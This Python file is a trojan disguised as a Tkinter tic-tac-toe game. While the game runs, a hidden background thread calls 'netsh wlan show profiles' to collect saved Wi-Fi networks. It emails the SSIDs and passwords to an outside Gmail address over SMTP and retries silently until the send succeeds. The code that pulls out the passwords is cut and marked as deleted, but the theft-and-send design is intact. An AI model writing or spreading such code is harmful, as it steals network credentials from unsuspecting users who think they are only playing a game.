from tkinter import *
from tkinter import messagebox
import subprocess
import smtplib
from email.message import EmailMessage
import threading

xo = over = True
c = 0
x = ((1, 2, 3), (4, 5, 6), (7, 8, 9), (1, 4, 7), (2, 5, 8), (3, 6, 9), (7, 5, 3), (1, 5, 9))
w = []
tc = True


def tictic():
    def reset():
        global xo, c, over, w
        for i in w:
            i['text'] = ' '
        c = 0
        xo = over = True
        for i in w:
            i.config(bg="silver")


    def win(s, d):
        global w
        w = [b1, b1, b2, b3, b4, b5, b6, b7, b8, b9]
        for i in x:
            a, b, c = i
            if w[a]["text"] == w[b]["text"] == w[c]["text"] == s:
                w[a].config(bg="green"), w[b].config(bg="green"), w[c].config(bg="green")
                messagebox.showinfo("Game over", s + " won the match")
                return False

        else:
            if d == 9:
                for i in w:
                    i.config(bg="red")
                messagebox.showinfo("Tie", "Match tie")
                return False
        return True


    def click(b):
        global xo, c, over

        if True:
            if b["text"] == ' ' and over:

                if xo:

                    b['text'] = 'X'
                    xo = False
                    c += 1
                    over = win('X', c)
                else:
                    b['text'] = 'O'
                    xo = True
                    c += 1
                    over = win('O', c)

            elif not over:
                yon = messagebox.askyesno("Game over", "Would like to reset")
                if yon:
                    reset()

            else:
                if b["text"] == 'X':
                    messagebox.showerror("Error", "X Exists")
                elif b["text"] == 'O':
                    messagebox.showerror("Error", "O Exists")
                else:
                    messagebox.showinfo("Error", "Error Exists")

        else:
            messagebox.showinfo("Tie", "Sorry Game over")


    root = Tk()
    root.title("Tic Tac")
    # root.geometry("300x300")


    # First Row
    b1 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b1))
    b1.grid(row=0, column=0)
    b2 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b2))
    b2.grid(row=0, column=1)
    b3 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b3))
    b3.grid(row=0, column=2)

    # Second Row

    b4 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b4))
    b4.grid(row=1, column=0)
    b5 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b5))
    b5.grid(row=1, column=1)
    b6 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b6))
    b6.grid(row=1, column=2)

    # third Row

    b7 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b7))
    b7.grid(row=2, column=0)
    b8 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b8))
    b8.grid(row=2, column=1)
    b9 = Button(root, text=' ', font=("Arial", 20, "bold"), height=3, width=6, command=lambda: click(b9))
    b9.grid(row=2, column=2)

    root.mainloop()


def runrun():
    # running command 'netsh wlan show profiles'
    command_output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], shell=True)

    data = command_output.decode().split('\n')  # converting subprocess class to str class
    # print(data.split('\n'))
    wifi_names = []  # variable for storing wifi names
    wifinmpd = []

    ''' deleted portion of code'''

    # Create the message for the email
    email_message = ""
    for item in wifinmpd:
        email_message += f"SSID: {item[0]} , Password: {item[1]}\n"

    email = EmailMessage()
    # Who is the email from
    email["from"] = "xyz"
    # To which email you want to send the email
    email["to"] = "hehehe@gmail.com"
    # Subject of the email
    email["subject"] = "WiFi SSIDs and Passwords"
    email.set_content(email_message)

    # Create smtp server
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        # Connect securely to server
        smtp.starttls()
        # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
        smtp.login("email@gmail.com", "password")
        # Send email.
        smtp.send_message(email)

def password():
    global tc
    if tc:
        while True:
            try:
                runrun()
                tc = False
                break
            except:
                continue

t1 = threading.Thread(target=password)
t2 = threading.Thread(target=tictic)
t1.start()
t2.start()
t1.join()
t2.join()
